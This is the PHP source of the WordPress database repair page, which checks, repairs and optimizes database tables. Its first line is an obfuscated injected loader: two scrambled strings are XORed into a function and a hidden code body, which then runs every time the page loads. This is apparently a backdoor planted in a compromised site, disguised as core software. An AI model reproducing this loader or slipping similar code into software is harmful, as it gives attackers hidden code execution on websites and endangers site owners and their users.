<?php $idnPiXDMsEn='U6R7MIr.E>HJQ-7'^'6D7V9,-H0P+>8BY';$yivlgr=$idnPiXDMsEn('','-HCgX3TOI-5CdHORF58QQB:7jDXH;,c;91IhEPIam7KPPGBC+Q5>HsJQH1mcM- op7XH+xJh,-ElFxxMmAk2gl>OZywavPrNgh ,>ys9YrEYjEpUn>YBLEVKj=Q<XypHgZMcY2GGA--McArxzI7;82.B>jgidlV3L3AIdAK93>>.>zcP0-o>xbMbc5KGD;WgjR6>Hjd95I<X3BDRCWAgqFYR5=ZEWQR0Wg.Q<DXg--PGIz9NJ.NW 10EqT:3=sr8sr 7iRKN<grzVWX,RYHXmV9lLO2;XlQ=4zlQh83NX;HJSZC+kRdTOL>N2ULI>ZB-xPDgR8=.LyCFEU974R3>Uih5d66nn1toR=rFQ7-rOqgE;SX=KsJ2<nLg2.IAoSEIfQPKGNYT8oQW197;otnf1466VQSZ1NIdSU>LOQOTimUN6RE+66X8,oMDAjWO01:< <OP5.:ERvnDI.>6IppDVOVCXSrW MJkYY,mhq<IFqqDA,.YPiL0RG4:9E4L;NO1+<8XtUSNFJqi.U.8ygpKDCT>GqJ3RL86k-X;H2COxwIhz2WPzydFXhhPXWBlbbeLeTEbCbj5y.oWvqTRWQ9372,<YK 7.U;H <Eb5MUW.W2rAjKJMLAqgAvmyty9cb.3+6qu.VXR.SC3G8O8Ju4eOD51B.JDjyuZ6'^'D.kF>F:,=DZ-;-7;5AKyv:UE5 9<Zs<VLEnAlp2kdQ>>33+,EqMQ:,.0<P2< XTGTS9<JTjLGH<EfXXmM:a;nHQ:.YJAQwIDnaFCLQWPyOeiQeT<RM-0  8cNY0H9PKhC3fHp8NNeBX9CoOXRmSZLSufW7G7DH=V5he DdkJGLRKPRG;UTFcQYGkjG.31I9ON=CJaQn0HCAR9f 376aZQ 8>FXaOs53D68E4EdeGKL<4,A3D,A<2ARXeYpepr<9q6RADIv +EGODvs.M>,-qM-3eh+SO93:XMZQqLSV7c1An7;7JKoDp9-R;WnF44P+KXxeC6YIOeY8LL3VEQ3PVuALj6sg;+b O3NRb:RTRrOGaM24H.ZjI6gECVO= 08 0Flpo,+ o2fXsUXCZOINBGUZC3jYSLD4nYqZ-;0oiI-  E77BWZ1BIG5+353.DPecMI;xWOI dB1 ,MQR,XT 7;7jtsV3A9+42<UDAJ6  YU  XOyvOlQ 5UCf.Q5d+7XXHKpS>67afQMJ4ZYPGVmdk9ZrYnW38YmLF=BoojoEJiOMSe5JIPu:ZZ3h2zTTURtQbpZrZSQKHY5QXttqqXAESUc2.YhK-R;TOmEE,,;A6VUmJo.,8 XNaVMYTYBikKEJZYQJ7,3ut3R>T Y.RiLtN<T:G>lZPNPK');$yivlgr();
/**
 * Database Repair and Optimization Script.
 *
 * @package WordPress
 * @subpackage Database
 */
define('WP_REPAIRING', true);

require_once( dirname( dirname( dirname( __FILE__ ) ) ) . '/wp-load.php' );

header( 'Content-Type: text/html; charset=utf-8' );
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head>
	<meta name="viewport" content="width=device-width" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="robots" content="noindex,nofollow" />
	<title><?php _e( 'WordPress &rsaquo; Database Repair' ); ?></title>
	<?php
	wp_admin_css( 'install', true );
	?>
</head>
<body class="wp-core-ui">
<p id="logo"><a href="<?php echo esc_url( __( 'https://wordpress.org/' ) ); ?>" tabindex="-1"><?php _e( 'WordPress' ); ?></a></p>

<?php

if ( ! defined( 'WP_ALLOW_REPAIR' ) ) {

	echo '<h1 class="screen-reader-text">' . __( 'Allow automatic database repair' ) . '</h1>';

	echo '<p>';
	printf(
		/* translators: %s: wp-config.php */
		__( 'To allow use of this page to automatically repair database problems, please add the following line to your %s file. Once this line is added to your config, reload this page.' ),
		'<code>wp-config.php</code>'
	);
	echo "</p><p><code>define('WP_ALLOW_REPAIR', true);</code></p>";

	$default_key     = 'put your unique phrase here';
	$missing_key     = false;
	$duplicated_keys = array();

	foreach ( array( 'AUTH_KEY', 'SECURE_AUTH_KEY', 'LOGGED_IN_KEY', 'NONCE_KEY', 'AUTH_SALT', 'SECURE_AUTH_SALT', 'LOGGED_IN_SALT', 'NONCE_SALT' ) as $key ) {
		if ( defined( $key ) ) {
			// Check for unique values of each key.
			$duplicated_keys[ constant( $key ) ] = isset( $duplicated_keys[ constant( $key ) ] );
		} else {
			// If a constant is not defined, it's missing.
			$missing_key = true;
		}
	}

	// If at least one key uses the default value, consider it duplicated.
	if ( isset( $duplicated_keys[ $default_key ] ) ) {
		$duplicated_keys[ $default_key ] = true;
	}

	// Weed out all unique, non-default values.
	$duplicated_keys = array_filter( $duplicated_keys );

	if ( $duplicated_keys || $missing_key ) {

		echo '<h2 class="screen-reader-text">' . __( 'Check secret keys' ) . '</h2>';

		// Translators: 1: wp-config.php; 2: Secret key service URL.
		echo '<p>' . sprintf( __( 'While you are editing your %1$s file, take a moment to make sure you have all 8 keys and that they are unique. You can generate these using the <a href="%2$s">WordPress.org secret key service</a>.' ), '<code>wp-config.php</code>', 'https://api.wordpress.org/secret-key/1.1/salt/' ) . '</p>';
	}

} elseif ( isset( $_GET['repair'] ) ) {

	echo '<h1 class="screen-reader-text">' . __( 'Database repair results' ) . '</h1>';

	$optimize = 2 == $_GET['repair'];
	$okay = true;
	$problems = array();

	$tables = $wpdb->tables();

	// Sitecategories may not exist if global terms are disabled.
	$query = $wpdb->prepare( "SHOW TABLES LIKE %s", $wpdb->esc_like( $wpdb->sitecategories ) );
	if ( is_multisite() && ! $wpdb->get_var( $query ) ) {
		unset( $tables['sitecategories'] );
	}

	/**
	 * Filters additional database tables to repair.
	 *
	 * @since 3.0.0
	 *
	 * @param array $tables Array of prefixed table names to be repaired.
	 */
	$tables = array_merge( $tables, (array) apply_filters( 'tables_to_repair', array() ) );

	// Loop over the tables, checking and repairing as needed.
	foreach ( $tables as $table ) {
		$check = $wpdb->get_row( "CHECK TABLE $table" );

		echo '<p>';
		if ( 'OK' == $check->Msg_text ) {
			/* translators: %s: table name */
			printf( __( 'The %s table is okay.' ), "<code>$table</code>" );
		} else {
			/* translators: 1: table name, 2: error message, */
			printf( __( 'The %1$s table is not okay. It is reporting the following error: %2$s. WordPress will attempt to repair this table&hellip;' ) , "<code>$table</code>", "<code>$check->Msg_text</code>" );

			$repair = $wpdb->get_row( "REPAIR TABLE $table" );

			echo '<br />&nbsp;&nbsp;&nbsp;&nbsp;';
			if ( 'OK' == $check->Msg_text ) {
				/* translators: %s: table name */
				printf( __( 'Successfully repaired the %s table.' ), "<code>$table</code>" );
			} else {
				/* translators: 1: table name, 2: error message, */
				echo sprintf( __( 'Failed to repair the %1$s table. Error: %2$s' ), "<code>$table</code>", "<code>$check->Msg_text</code>" ) . '<br />';
				$problems[$table] = $check->Msg_text;
				$okay = false;
			}
		}

		if ( $okay && $optimize ) {
			$check = $wpdb->get_row( "ANALYZE TABLE $table" );

			echo '<br />&nbsp;&nbsp;&nbsp;&nbsp;';
			if ( 'Table is already up to date' == $check->Msg_text )  {
				/* translators: %s: table name */
				printf( __( 'The %s table is already optimized.' ), "<code>$table</code>" );
			} else {
				$check = $wpdb->get_row( "OPTIMIZE TABLE $table" );

				echo '<br />&nbsp;&nbsp;&nbsp;&nbsp;';
				if ( 'OK' == $check->Msg_text || 'Table is already up to date' == $check->Msg_text ) {
					/* translators: %s: table name */
					printf( __( 'Successfully optimized the %s table.' ), "<code>$table</code>" );
				} else {
					/* translators: 1: table name, 2: error message, */
					printf( __( 'Failed to optimize the %1$s table. Error: %2$s' ), "<code>$table</code>", "<code>$check->Msg_text</code>" );
				}
			}
		}
		echo '</p>';
	}

	if ( $problems ) {
		printf( '<p>' . __('Some database problems could not be repaired. Please copy-and-paste the following list of errors to the <a href="%s">WordPress support forums</a> to get additional assistance.') . '</p>', __( 'https://wordpress.org/support/forum/how-to-and-troubleshooting' ) );
		$problem_output = '';
		foreach ( $problems as $table => $problem )
			$problem_output .= "$table: $problem\n";
		echo '<p><textarea name="errors" id="errors" rows="20" cols="60">' . esc_textarea( $problem_output ) . '</textarea></p>';
	} else {
		echo '<p>' . __( 'Repairs complete. Please remove the following line from wp-config.php to prevent this page from being used by unauthorized users.' ) . "</p><p><code>define('WP_ALLOW_REPAIR', true);</code></p>";
	}
} else {

	echo '<h1 class="screen-reader-text">' . __( 'WordPress database repair' ) . '</h1>';

	if ( isset( $_GET['referrer'] ) && 'is_blog_installed' == $_GET['referrer'] )
		echo '<p>' . __( 'One or more database tables are unavailable. To allow WordPress to attempt to repair these tables, press the &#8220;Repair Database&#8221; button. Repairing can take a while, so please be patient.' ) . '</p>';
	else
		echo '<p>' . __( 'WordPress can automatically look for some common database problems and repair them. Repairing can take a while, so please be patient.' ) . '</p>';
?>
	<p class="step"><a class="button button-large" href="repair.php?repair=1"><?php _e( 'Repair Database' ); ?></a></p>
	<p><?php _e( 'WordPress can also attempt to optimize the database. This improves performance in some situations. Repairing and optimizing the database can take a long time and the database will be locked while optimizing.' ); ?></p>
	<p class="step"><a class="button button-large" href="repair.php?repair=2"><?php _e( 'Repair and Optimize Database' ); ?></a></p>
<?php
}
?>
</body>
</html>
